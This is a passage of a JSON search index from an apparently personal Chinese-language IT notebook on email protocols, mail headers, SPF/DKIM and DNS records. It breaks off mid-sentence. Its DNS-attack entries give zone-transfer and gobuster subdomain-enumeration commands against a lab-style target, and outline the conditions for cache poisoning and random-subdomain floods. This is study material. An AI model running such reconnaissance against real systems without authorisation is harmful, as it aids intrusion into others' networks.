<li>25\uff1a\u5df2\u8fc7\u65f6\u4e14\u4e0d\u63a8\u8350\u3002\u5982\u679c\u4f7f\u7528\u6b64\u7aef\u53e3\uff0c\u5fc5\u987b\u542f\u7528\u7528\u6237\u540d/\u5bc6\u7801\u8eab\u4efd\u9a8c\u8bc1\u3002</li> <li>465\uff1a\u542f\u7528SSL\u529f\u80fd\u3002</li> <li>587\uff08\u636e\u8bf4\u6bd425\u66f4\u5e38\u7528\uff09\uff1aMSA\uff08message submission agent\uff09\u3002\u867d\u7136\u662f\u4e0d\u5b89\u5168\u4f20\u8f93\uff0c\u4f46\u53ef\u4ee5\u4f7f\u7528 STARTTLS \u5347\u7ea7\u4e3a\u5b89\u5168\u8fde\u63a5\u3002</li> </ul>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#pop3","title":"POP3","text":"<p>\u4e0b\u8f7d\u3001\u5220\u9664\u3002</p> <ul> <li>110\uff1a\u672a\u52a0\u5bc6</li> <li>995\uff1a\u52a0\u5bc6\uff08SSL\uff0c\u4e0b\u540c\uff09</li> </ul>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#imap","title":"IMAP","text":"<p>\u5c06\u90ae\u4ef6\u5b58\u50a8\u5728\u670d\u52a1\u5668\u4e0a\u5e76\u540c\u6b65\u591a\u4e2a\u8bbe\u5907\u4e4b\u95f4\u7684\u534f\u8bae\u3002</p> <ul> <li>143\uff1aIMAP4 Unencrypted</li> <li>993\uff1aIMAP4 Encrypted</li> </ul>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#email","title":"\u4e24\u79cd\u65b9\u5f0f\u8bbf\u95eeEmail","text":"<ul> <li>Email\u5ba2\u6237\u7aef\uff1a\u5982Outlook\u3002</li> <li>WebMail\uff1a\u5982GMail\u3002\u4f7f\u7528\u7684\u4e0d\u662fPOP3/IMAP\uff0c\u800c\u662fHTTPS\u3002</li> </ul>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#email_1","title":"\u5b9e\u73b0Email\u7684\u5404\u4e2a\u529f\u80fd\u7ec4\u4ef6","text":"","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#_2","title":"\u7528\u6237\u7aef","text":"<p>MUA\uff08User\uff09\uff1a\u6536\u53d1\u4fe1\u4ef6\u3002\u5982Outlook\u7b49\u7684Email\u5ba2\u6237\u7aef\u3002</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#_3","title":"\u670d\u52a1\u7aef","text":"<p>MTA\uff08Mail Transfer Agent\uff09\uff1aSMTP\u670d\u52a1\u5668\u3002\u53ef\u770b\u505aMailSrv\u95f4\u6700\u4e3b\u8981\u7684\u529f\u80fd\uff0c\u5728\u5404\u670d\u52a1\u5668\u95f4\u8f6c\u53d1\u4fe1\u4ef6\u3002\u5982Postfix\u3001Exchange\u670d\u52a1\u5668\u3002 \u7aef\u70b9MailSrv\u53e6\u6709\uff1a - MSA\uff08Submission\uff09\uff1a\u53d7\u7406\u5ba2\u6237\u7aef\u53d1\u4fe1\u3001\u7528\u6237\u8ba4\u8bc1\u3002\u5982Postfix\u3001Exchange\u670d\u52a1\u5668 - MDA\uff08Delivery\uff09\uff1a\u653e\u5165MailBox\u3002\u5982mail.local\u3001Qpopper - MRA\uff08Retrieval\uff09\uff1a\u53d6\u51fa\u4fe1\u4ef6\u3001\u7528\u6237\u8ba4\u8bc1\u3002\u5982Qpopper\u3001uw-imap\u3010POP\u3001IMAP\u3011</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#_4","title":"\u6d41\u7a0b","text":"<p>MUA\u2014\u2014MSA\u2014\u2014MTA\u2014\u2014MTA(\u8fb9\u754c\u7f51\u5173)\u2014\u2014MTA\u2014\u2014MDA\u2014\uff08MailBox\uff09\u2014MRA\u2014\u2014MUA</p> <ul> <li>\u6536\u4fe1\u65b9\u7684MTA\u4fe1\u606f\uff08\u57df\u540d\u3001IP\u7b49\uff09\u90fd\u6ce8\u518c\u5728\u6536\u4fe1\u65b9DNS\u7684MX\u8bb0\u5f55\u3001A\u8bb0\u5f55\u3002\u6240\u4ee5\u53d1\u4fe1\u65b9\u7684MTA\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u4fe1\u606f\u53d1\u9001\u4fe1\u4ef6\u5230\u5bf9\u65b9MTA\u3002</li> </ul> <p>\u8be6\u7ec6\uff1a https://mailtrap.io/blog/smtp-commands-and-responses/#Essential-SMTP-commands-in-the-order-they-may-be-used</p> <ol> <li>\u67e5MX</li> <li>\u5efa\u7acbTCP\u8fde\u63a5\uff08netcat\u6216telnet\uff09</li> <li><code>HELO</code>\u6216<code>EHLO</code>\u547d\u4ee4\uff0c\u5411MailSrv\u63d0\u4f9b\u81ea\u5df1\u7684\u57df\u540d</li> <li><code>MAIL FROM</code>\u547d\u4ee4\uff0c\u5411MailSrv\u63d0\u4f9b\u53d1\u4ef6\u4eba\u5730\u5740     SMTP\u662f\u4e00\u4e2a\u5f88\u7b80\u5355\u7684\u534f\u8bae\uff0c\u672c\u8eab\u6ca1\u89c4\u5b9a\u5982\u4f55\u9a8c\u8bc1\u90ae\u4ef6\u6765\u6e90\u3002\u540e\u6765MailSrv\u7528\u7684\u65b9\u6cd5\uff1a<ul> <li>\u67e5MX</li> <li>DNS\u53cd\u5411\u89e3\u6790\uff08memo\uff1anslookup -qt=ptr \uff09</li> <li>\u9a8c\u8bc1\u90ae\u4ef6\u5730\u5740\u662f\u5426\u5b58\u5728</li> <li>\u2026\u2026</li> </ul> </li> <li><code>RCPT TO</code>\uff0c\u9a8c\u8bc1\u90ae\u4ef6\u5730\u5740\u662f\u5426\u5b58\u5728</li> <li><code>QUIT</code>\u547d\u4ee4\uff0c\u5173\u95edTCP\u8fde\u63a5</li> </ol>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#email_2","title":"Email\u62a5\u5934","text":"<p>[!NOTE] \u53c2\u7167SMTP\u547d\u4ee4\u66f4\u5bb9\u6613\u7406\u89e3</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#mail-from-envelope-from","title":"MAIL FROM (Envelope From)","text":"<p>SMTP\u670d\u52a1\u5668\u5730\u5740\u2014\u2014\u76f8\u5f53\u4e8e\u4fe1\u5c01\u3002</p> <ul> <li>\u7528\u6237\u662f\u770b\u4e0d\u5230\u4fe1\u5c01\u7684 <code>MAIL FROM</code> \u7684\u2014\u2014\u8fd9\u662f\u7ed9SMTP\u670d\u52a1\u5668\u770b\u7684\uff0c\u7528\u4e8eSMTP\u670d\u52a1\u5668\u4e4b\u95f4\u8f6c\u53d1\u2014\u2014\u62a5\u5934\u7684 <code>From</code> \u5b57\u6bb5</li> <li>\u5bb9\u6613\u4f2a\u9020\u2014\u2014\u6240\u4ee5\u6709SPF\u6216DKIM\u7b49\u9632\u5fa1\u6280\u672f<ul> <li>SPF\uff1a\u5411\u5bf9\u65b9DNS\u786e\u8ba4\u8fd9\u4e2a\u5730\u5740\u662f\u5426\u6765\u81ea\u6307\u5b9aIP</li> <li>DKIM\uff1a\u9a8c\u8bc1\u516c\u94a5\u7b7e\u540d</li> </ul> </li> <li>\u9001\u4fe1\u5931\u8d25\u7684\u8bdd\u53d1\u56de\u7ed9\u8fd9\u91cc\uff0c\u5e76\u53d1\u9001non-delivery report (NDR)</li> </ul>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#from-header-from","title":"From (Header From)","text":"<p>\u90ae\u4ef6\u5ba2\u6237\u7aef\uff08Mailer\uff09\u4e0a\u663e\u793a\u7684\u53d1\u4ef6\u4eba\u2014\u2014\u76f8\u5f53\u4e8e\u4fe1\u4ef6\u62ac\u5934\uff0c\u5176\u5b9e\u7b97\u662f\u4fe1\u4ef6\u5185\u5bb9\u4e86\u2014\u2014\u53ef\u968f\u610f\u4f2a\u9020\uff0c\u6240\u4ee5\u624d\u8981\u9a8c\u8bc1\u3002</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#receivedmailsrv","title":"Received\uff1a\u7ecf\u7531\u7684MailSrv","text":"<ul> <li>\u6700\u4e0a\u9762\u7684received\u662f\u6536\u4fe1\u4eba\u7684MailSrv</li> <li>\u6700\u4e0b\u9762\u7684received\u662f\u9001\u4fe1\u4eba\u7684MailSrv\uff0c\u53ef\u4ee5whois\uff0c\u5224\u65adspam<ul> <li>from\uff1a\u9001\u4fe1MailSrv\u3010<code>HELO</code>\u547d\u4ee4\u3011</li> <li>by\uff1a\u6536\u4fe1MailSrv</li> <li>with\uff1amail\u4f20\u8f93\u534f\u8bae</li> <li>for\uff1a\u6536\u4fe1\u4ebamailaddr\u3010<code>RCPT TO</code>\u547d\u4ee4\u3011</li> <li>id\uff1aMailSrv\u7684ID</li> <li>via\uff1a\u7ecf\u8fc7\u5730\u7684\u73af\u5883&amp;\u534f\u8bae</li> </ul> </li> </ul>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#return-path","title":"Return-Path\uff1a\u53d1\u4fe1\u5931\u8d25\u65f6\u7684\u8fd4\u56de\u5730\u5740","text":"<ul> <li>\u4e00\u822c\uff0c\u7ed9Envelope From\uff08\u5373\u7531 <code>MAIL FROM</code> \u547d\u4ee4\u901a\u77e5\u7684\u53d1\u4fe1\u4eba\uff09\uff0c\u4e0d\u8fc7\u4e5f\u53ef\u4ee5\u7528Return-Path\u7279\u522b\u6307\u5b9a\u3002</li> <li>\u4f18\u70b9\uff1a\u7ba1\u7406\u9001\u4fe1\u5931\u8d25mail\uff08\u5f39\u56de\u90ae\u4ef6\uff0c\u4e00\u76f4\u5bf9\u4e0d\u53ef\u9001\u8fbe\u7684\u76ee\u7684\u5730\u53d1\u4fe1\u7684\u8bdd\uff0c\u5f71\u54cd\u4fe1\u8a89\uff09</li> </ul>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#reply-to","title":"Reply-To\uff1a\uff08\u70b9\u51fb\uff09\u56de\u4fe1\u7684\u5730\u5740","text":"","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#raw-datamime","title":"\u5173\u4e8eraw data\uff08MIME\u6570\u636e\uff09","text":"","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#encoded-word","title":"\u62a5\u5934\uff1aEncoded-Word\u683c\u5f0f","text":"<p>\u90ae\u4ef6\u6807\u9898\uff08Subject\uff09\u548c\u5176\u4ed6\u5934\u90e8\u5b57\u6bb5\uff08\u5982\u53d1\u4ef6\u4eba\u3001\u6536\u4ef6\u4eba\u7b49\uff09\u901a\u5e38\u4f7f\u7528 MIME \u7f16\u7801\uff08\u5982 =?UTF-8?B?...?=\u3002\u6709Base64\u6216Quoted-Printable\uff09\u6765\u5904\u7406\u7279\u6b8a\u5b57\u7b26\u6216\u975e ASCII \u5b57\u7b26\u3002\u8fd9\u79cd\u7f16\u7801\u65b9\u5f0f\u88ab\u79f0\u4e3a\u201cEncoded-Word\u201d\u683c\u5f0f\uff0c\u5b9a\u4e49\u5728 MIME\uff08\u591a\u7528\u9014\u4e92\u8054\u7f51\u90ae\u4ef6\u6269\u5c55\uff09\u6807\u51c6\u4e2d\u3002 Encoded-Word \u683c\u5f0f\u5141\u8bb8\u90ae\u4ef6\u5934\u90e8\u5b57\u6bb5\u5305\u542b\u975e ASCII \u5b57\u7b26\uff0c\u5982\u4e2d\u6587\u3001\u65e5\u6587\u3001\u97e9\u6587\u7b49\u5b57\u7b26\u3002\u8fd9\u79cd\u683c\u5f0f\u901a\u5e38\u4ee5 =?charset?encoding?encoded text?= \u7684\u5f62\u5f0f\u51fa\u73b0\uff0c\u5176\u4e2d\uff1a - charset \u662f\u5b57\u7b26\u96c6\uff0c\u5982 UTF-8\u3001ISO-8859-1 \u7b49\u3002 - encoding \u662f\u7f16\u7801\u65b9\u5f0f\uff0c\u901a\u5e38\u662f B \uff08\u8868\u793a base64 \u7f16\u7801\uff09\u6216 Q \uff08\u8868\u793a quoted-printable \u7f16\u7801\uff09\u3002   - \u7b49\u53f7\uff08\u201c=\u201d\uff09\u7528\u4f5c\u79f0\u4e3a\u201c\u5f15\u7528\u6253\u5370\uff08Quoted-printabl\uff09\u201d\u7684\u7f16\u7801\u673a\u5236\u7684\u4e00\u90e8\u5206\u3002\u662f\u4e00\u79cd\u7528\u4e8e\u4ee5\u4e3b\u8981\u4e3a\u7535\u5b50\u90ae\u4ef6\u8bbe\u8ba1\u7684\u6587\u672c\u683c\u5f0f\u8868\u793a\u4e0d\u53ef\u6253\u5370\u6216\u7279\u6b8a\u5b57\u7b26\u7684\u65b9\u6cd5\u3002 - encoded text \u662f\u6309\u7167\u6307\u5b9a\u7684\u5b57\u7b26\u96c6\u548c\u7f16\u7801\u65b9\u5f0f\u7f16\u7801\u540e\u7684\u6587\u672c\u3002</p> <p>\u5728 Python \u4e2d\uff0c\u4f7f\u7528 <code>email.header.decode_header()</code> \u51fd\u6570\u65f6\uff0c\u901a\u5e38\u4e0d\u9700\u8981\u6307\u5b9a\u7f16\u7801\u683c\u5f0f\u3002<code>decode_header()</code> \u51fd\u6570\u7684\u76ee\u7684\u662f\u89e3\u7801\u90ae\u4ef6\u5934\u90e8\u5b57\u6bb5\u4e2d\u7684 MIME \u7f16\u7801\uff08Encoded-Word\uff09\u6587\u672c\uff0c\u5b83\u4f1a\u81ea\u52a8\u5904\u7406\u7f16\u7801\u548c\u5b57\u7b26\u96c6\u7684\u8bc6\u522b\u3002 #IT/Python </p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#_5","title":"\u6b63\u6587","text":"<ul> <li>\u7f16\u7801\uff1a<code>Content-Transfer-Encoding</code> \u62a5\u5934\u6307\u5b9a\u90ae\u4ef6\u6b63\u6587\uff08body\uff09\u7684\u7f16\u7801\u65b9\u5f0f\u3002</li> <li>\u5b57\u7b26\u96c6\uff1a\u90ae\u4ef6\u6b63\u6587\u7684\u5b57\u7b26\u96c6\u901a\u5e38\u5728 <code>Content-Type</code> \u5934\u90e8\u5b57\u6bb5\u4e2d\u6307\u5b9a\u3002</li> </ul>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#imf","title":"IMF?","text":"<p>The syntax for email messages is known as the Internet Message Format</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Email/#_6","title":"\u9493\u9c7c","text":"<ul> <li>Defang\uff1a\u5982\u5728URL\u3001IP\u7684\u70b9\u4e24\u8fb9\u52a0\u4e0a\u4e2d\u62ec\u53f7\uff0c<code>[.]</code>\u3002 #IT/\u84dd\u961f </li> <li>Pixel tracking\uff1a email-pixel-trackers-how-to-stop-images-automatic-download</li> </ul>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/","title":"DNS","text":"","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#_1","title":"\u540d\u79f0\u89e3\u6790\u987a\u5e8f","text":"<p>\u4ee5\u6d4f\u89c8\u5668\u4e3e\u4f8b\uff0c\u8f93\u5165URL\u540e\uff0c\u540d\u79f0\u89e3\u6790\u7684\u987a\u5e8f\u5982\u4e0b\uff1a</p> <ol> <li>\u672c\u5730hosts\u6587\u4ef6</li> <li>OS\u7684DNS\u7f13\u5b58<ul> <li>Windows\u7684\u53eb\u505aDNSClient\u3002\u53ef\u7528 <code>ipconfig /displaydns</code> \u67e5\u770b</li> </ul> </li> <li>\u6307\u5b9a\u7684DNS\u670d\u52a1\u5668\u7684\u7f13\u5b58\u3010\u5f53\u6709\u914d\u7f6eDNS\u540e\u7f00/\u52a0\u5165\u57df\u65f6\uff0c\u4f1a\u5c06DNS\u540e\u7f00\u7ec4\u5408hostname\u53bb\u627eDNS\u3011</li> <li>[[LLMNR]]\u548cNBNS\u3010\u6ca1\u6709\u914d\u7f6eDNS\u540e\u7f00\u65f6\uff0c\u5c31\u7528NBNS\u89e3\u6790\u540d\u79f0\u3011</li> <li>\u9012\u5f52\u89e3\u6790</li> </ol>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#zone-file","title":"Zone file","text":"<p>https://en.wikipedia.org/wiki/Zone_file</p> <p>see also\u00a0Microsoft DNS\u00a0with\u00a0Active Directory-database integration.</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#file-format","title":"File format","text":"<p>\u6307\u4ee4\uff1a\u4ee5 <code>$</code> \u5f00\u5934 + \u4e00\u4e2a\u5173\u952e\u5b57\u3002\uff08\u4e00\u5171\u67093\u4e2a\uff1f\uff09</p> <ul> <li><code>$ORIGIN</code>\uff1a\u6307\u793a\u57df\u540d\u3002\u4e00\u822c\u5728\u7b2c\u4e00\u884c\u3002<code>@</code>\u4e5f\u6307\u4ee3<code>$ORIGIN</code></li> <li><code>$TTL</code>\uff1a\u6307\u5b9a\u9ed8\u8ba4TTL\u3002</li> </ul> <p>Resource records (RR) \u7684\u5b57\u6bb5\u683c\u5f0f\uff08\u4e24\u79cd\u90fd\u53ef\uff0c\u5c31\u662fTTL\u4f4d\u7f6e\u53d8\u4e86\uff09\uff1a</p> 1 2 3 4 5 name ttl record class record type record data name record class ttl record type record data <ul> <li>\u5206\u9694\u7b26\u3001\u7ed3\u675f\u7b26\uff1a</li> </ul> <p>fields separated by any combination of white space (tabs and spaces), and ends at a line boundary except inside a quoted string field value or a pair of enclosing formatting parentheses.</p> <ul> <li>name\uff1a\u53ef\u4ee5\u7559\u7a7a\uff0c\u6b64\u65f6\u7ee7\u627f\u4e0a\u4e00\u6761RR\u7684name\u3002\u4e5f\u53ef\u4ee5\u7528<code>@</code>\u6307\u4ee3<code>$ORIGIN</code>\u3002</li> </ul> <p>\u5229\u7528\uff1aDNS#\u57df\u4f20\u8f93</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#dnsrecord-type","title":"DNS\u8bb0\u5f55\uff08record type\uff09","text":"<ul> <li>SOA\uff1astart of authority record</li> <li>CNAME\uff1a\u522b\u540d</li> <li>PTR\uff1aPointer\uff0c\u57df\u540d\u53cd\u67e5</li> <li>MX\uff1aMail Exchange</li> <li>TXT\uff1atext</li> <li>SRV\uff1a\u670d\u52a1\uff08\u6307\u5b9a\u670d\u52a1\u7684\u670d\u52a1\u5668\uff09</li> <li>RP\uff1a\u8d1f\u8d23\u4eba</li> <li>HINFO\uff1ahost\u4fe1\u606f</li> </ul>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#soa","title":"SOA","text":"<p>\u5728\u57df\u6587\u4ef6RR\u7684\u7b2c\u4e00\u884c\uff0c\u5176\u4ed6RR\u7684\u987a\u5e8f\u968f\u610f\u3002</p> <ul> <li>\u6307\u793a\u4e3b\u8981\u6743\u5a01DNS\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5217\u51fa DNS \u7f13\u5b58\u7684\u5185\u5bb9\u3002</li> <li>\u8fd8\u5305\u542b\u8d1f\u8d23\u7ba1\u7406DNS\u7684\u4eba\u5458\u7684\u7535\u5b50\u90ae\u4ef6\u5730\u5740\uff08\u8868\u793a\u4e3a\u57df\u540d\uff0c\u56e0\u4e3a\u5e26\u6709\u53e5\u53f7\u5b57\u7b26\u4ee3\u66ff\u901a\u5e38\u7684@\u7b26\u53f7\uff09</li> <li>\u8fd8\u6307\u5b9a\u8ba1\u65f6\u548c\u8fc7\u671f\u53c2\u6570\u5217\u8868\uff08\u5e8f\u5217\u53f7\u3001\u4ece\u5c5e\u5237\u65b0\u5468\u671f\u3001\u4ece\u5c5e\u91cd\u8bd5\u65f6\u95f4\u3001\u4ece\u5c5e\u8fc7\u671f\u65f6\u95f4\u4ee5\u53ca\u7f13\u5b58\u8bb0\u5f55\u7684\u6700\u5927\u65f6\u95f4\uff09\u3002</li> </ul>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#cname","title":"CNAME","text":"","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#ptr","title":"PTR","text":"","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#mx","title":"MX","text":"<p>\u90ae\u4ef6\u4ea4\u6362\u8bb0\u5f55\uff0c\u57df\u540d\u548c\u90ae\u4ef6\u670d\u52a1\u5668\u7684\u6620\u5c04\uff08\u627e\u5bf9\u5e94\u57df\u91cc\u7684\u90ae\u4ef6\u4e3b\u673a\uff09\u3002  </p> <ul> <li><code>\u7528\u6237\u540d@\u57df\u540d</code> \u2192 <code>\u7528\u6237\u540d@\u90ae\u4ef6SVR\u7684\u4e3b\u673a\u540d.\u57df\u540d</code></li> <li>\u7531\u4e8e\u57df\u540d\u4e0d\u4ee3\u8868\u7279\u5b9a\u4e3b\u673a\uff0c\u6240\u4ee5\u8981\u67e5\u8be2DNS\u91cc\u7684MX\u8bb0\u5f55\uff0c\u901a\u8fc7\u57df\u540d\u5bf9\u5e94\u90ae\u4ef6\u670d\u52a1\u5668\uff0c\u518d\u627e\u90ae\u4ef6SVR\u7684A\u8bb0\u5f55\u2014\u2014\u5373ip</li> </ul> <p>\u4f8b\u5982\uff1a \u5f53Internet\u4e0a\u7684\u67d0\u7528\u6237\u8981\u53d1\u4e00\u5c01\u4fe1\u7ed9 user@mydomain.com \u65f6\uff0c \u8be5\u7528\u6237\u7684\u90ae\u4ef6\u7cfb\u7edf\u901a\u8fc7DNS\u67e5\u627e <code>mydomain.com</code> \u8fd9\u4e2a\u57df\u540d\u7684MX\u8bb0\u5f55\uff0c\u5982\u679cMX\u8bb0\u5f55\u5b58\u5728\uff0c\u5f97\u5230\u90ae\u4ef6SVR\u7684host\u540d\uff08<code>mail.mydomain.com</code>\uff09\uff0c \u7136\u540eDNS\u6839\u636ehost\u540d\u67e5A\u8bb0\u5f55\u627e\u5230IP\uff0c\u9001\u4fe1OK\u3002</p> <p>\u5f53SMTP\u670d\u52a1\u5668\u63a5\u6536\u5230\u4e0d\u5c5e\u4e8e\u81ea\u5df1\u57df\u7684\u90ae\u4ef6\u5730\u5740\u65f6\uff0c\u5c06\u90ae\u4ef6\u8f6c\u53d1\u7ed9\u5176\u4ed6SMTP\u670d\u52a1\u5668\u3002 \u800c\u5982\u4f55\u51b3\u5b9a\u53bb\u54ea\u4e2aSMTP\u670d\u52a1\u5668 \u2192 \u67e5\u8be2DNS\u7684MX\u8bb0\u5f55\u3002</p> <p>\u5173\u4e8e\u4f18\u5148\u7ea7\uff1aMX \u8bb0\u5f55\u6709\u4e00\u4e2a\u4f18\u5148\u7f16\u53f7\uff08preference number\uff09\uff0c\u544a\u8bc9 SMTP \u5ba2\u6237\u7aef\u6309\u987a\u5e8f\u5c1d\u8bd5\uff08\u5e76\u91cd\u8bd5\uff09\u5217\u8868\u4e2d\u7684\u6bcf\u4e2a\u76f8\u5173\u5730\u5740\uff0c\u76f4\u5230\u6295\u9012\u5c1d\u8bd5\u6210\u529f\u3002 \u504f\u53f7\u5c0f\u7684\u4f18\u5148\u7ea7\u9ad8\u3002(\u5728\u8bb8\u591a\u60c5\u51b5\u4e0b\uff0c\u90ae\u4ef6\u670d\u52a1\u5668\u8bb0\u5f55\u914d\u7f6e\u4e3a\u76f8\u540c\u7684\u503c\uff0c\u4ee5\u786e\u4fdd\u90ae\u4ef6\u5747\u5300\u5730\u6d41\u5411\u6bcf\u4e2a\u670d\u52a1\u5668)</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#txt","title":"TXT","text":"<p>\u4e00\u822c\u6307\u67d0\u4e2a\u4e3b\u673a\u540d\u6216\u57df\u540d\u7684\u8bf4\u660e\uff0c\u6216\u8005\u8054\u7cfb\u65b9\u5f0f\uff0c\u6216\u8005\u6807\u6ce8\u63d0\u9192\u7b49\u7b49\u3002</p> <p>\u4e0d\u8fc7\u6709\u5e94\u7528\u4e8eEmail\u5b89\u5168\u3002</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#srv","title":"SRV","text":"<p>an example of an SRV record response: <code>_ldap._tcp.example.com. 86400 IN SRV 0 5 389 ldap-server.example.com.</code> In this example, the service is \"_ldap\" using the TCP protocol, with a priority of 0, a weight of 5, and a port of 389. The target host is \"ldap-server.example.com\".</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#dns","title":"DNS\u653b\u51fb","text":"","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#_2","title":"\u57df\u4f20\u8f93","text":"<p>\u526fDNS\u5411\u4e3bDNS\u53d1\u9001 <code>AXFR</code>(Asynchronous Full Zone Transfer) \u7684\u8bf7\u6c42\u3002\u4e3bDNS\u8fd4\u56deSOA\u3002</p> <pre><code># \u5982\u679c\u6210\u529f\uff0c\u53ef\u80fd\u4f1a\u66b4\u9732 HTTP server names\ntarget_domain='mysite.test'\ntarget_ip='10.10.100.44'\nhost -T -l $target_domain $target_ip\n\n# \u5982\u679c\u5931\u8d25\uff0c\u53ef\u624b\u52a8\u679a\u4e3e\ngobuster dns -r $target_ip -d $target_domain -w $dns_wordlist -t 100\n</code></pre>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#dnspharming","title":"DNS\u6c61\u67d3\uff08\u8054\u7cfbPharming\uff09","text":"<p>\u5229\u7528\u6761\u4ef6\uff1a</p> <ol> <li>\u5bf9\u76ee\u6807DNS\u8bf7\u6c42\u5176\u672a\u6ce8\u518c\u7684\u57df\u540d<ul> <li>\u4ee5\u524d\uff1a\u53ef\u4ee5\u5c06cache\u7684TTL\u8bbe\u7f6e\u5f88\u957f\u4ee5\u9632\u5fa1</li> <li>\u540e\u6765\uff1aKaminsky's attack\u4f7f\u4e0a\u8ff0\u9632\u5fa1\u5931\u6548</li> </ul> </li> <li>\u5411\u76ee\u6807DNS\u5bf9\u4e0a\u7ea7DNS\u53d1\u8bf7\u6c42\u65f6\u7684\u6e90\u7aef\u53e3\u53d1\u9001\u54cd\u5e94\u2014\u2014\u4e00\u822c\u90fd\u662f53</li> <li>\u76ee\u6807DNS\u5bf9\u4e0a\u7ea7DNS\u53d1\u9001\u8bf7\u6c42\u4e0e\u6536\u5230\u54cd\u5e94\u65f6\u7684transactionID\uff08DNS\u8bf7\u6c42\u7684\u4e00\u4f4d\u6807\u8bc6\u7b26\uff09\u9700\u8981\u4e00\u81f4\u2014\u2014ID\u957f\u5ea6\u4e3a16bit\uff08\u6700\u592765535\uff09\uff0c\u6240\u4ee5\u53ef\u4ee5\u679a\u4e3e</li> <li>\u6bd4\u5408\u6cd5DNS\u66f4\u65e9\u8fd4\u56de\u54cd\u5e94</li> </ol> <p>\u53e6\u5916\uff1a\u5165\u4fb5\uff08\u5ba2\u6237\u7aef/\u670d\u52a1\u5668\uff09\u540e\u66f4\u6539hosts\u6587\u4ef6</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#dos","title":"DoS","text":"<p>\u8fc7\u53bb\u6709\u8fc7\u4e8b\u4ef6\u3002\u4e0d\u8fc7\u90fd\u662f\u56e0\u4e3a\u6f0f\u6d1e\uff0c\u6240\u4ee5\u66f4\u65b0\u6253\u8865\u4e01\u5c31\u89e3\u51b3\u4e86\u3002</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#dnsdns-amp","title":"DNS\u53cd\u5c04/\u589e\u5e45\uff08DNS amp\uff09","text":"","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#water-torture","title":"\u968f\u673a\u5b50\u57df\u653b\u51fb\u3001Water Torture\uff08\u6c34\u8cac\u3081\uff09","text":"<p>\u5bf9\u76ee\u6807\u57df\u540d\u53d1\u9001\u5927\u91cf\u968f\u673a\u5b50\u57df\uff0c\u8ba9\u5176\u6743\u5a01DNS\u8fc7\u8f7d</p>","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#dns_1","title":"DNS\u96a7\u9053","text":"","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#dns-cache-snooping","title":"DNS cache snooping","text":"","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#_3","title":"\u5de5\u5177","text":"","tags":["IT/\u7f51\u7edc"]},{"location":"Resources/Network/Protocol/DNS/#dig-domain-information-groper","title":"dig (Domain Information Groper)","text":"<ul> <li><code>dig tryhackme.com @1.1.1.1</code></li> </ul> <p>\u80fd\u4ece\u57df\u540d\u7684\u5b98\u65b9DNS\u67e5\u5230\u6743\u5a01\u89e3\u7b54\uff0c\u800cnslookup\u662f\u4ececache\u4e2d\u5f97\u5230\u7684\u975e\u6743\u5a01\u89e3\u7b54\u3002\uff08?\uff09</p> <ul> <li>\u8981\u83b7\u53d6\u7535\u5b50\u90ae\u4ef6\u8bb0\u5f55\uff0c\u8bf7\u6307\u5b9a<code>-t MX</code>\uff1a<code>dig &lt;target&gt; -t MX</code></li> <li>\u8981\u83b7\u5f97\u533a\u57df\u4f20\u8f93\uff0c\u8bf7\u6307\u5b9a <code>axfr</code>\uff1a<code>dig axfr @nsztm1.digi.ninja zonetransfer.me</code>\u3002<ul> <li><code>@nsztm1.digi.ninja</code>\uff1a\u8fd9\u662f\u6307\u5b9a\u7684 DNS \u670d\u52a1\u5668\u5730\u5740\uff0c<code>@</code> \u540e\u9762\u7684\u90e8\u5206\u8868\u793a\u8981\u5411 <code>nsztm1.digi.ninja</code> \u8fd9\u4e2a DNS 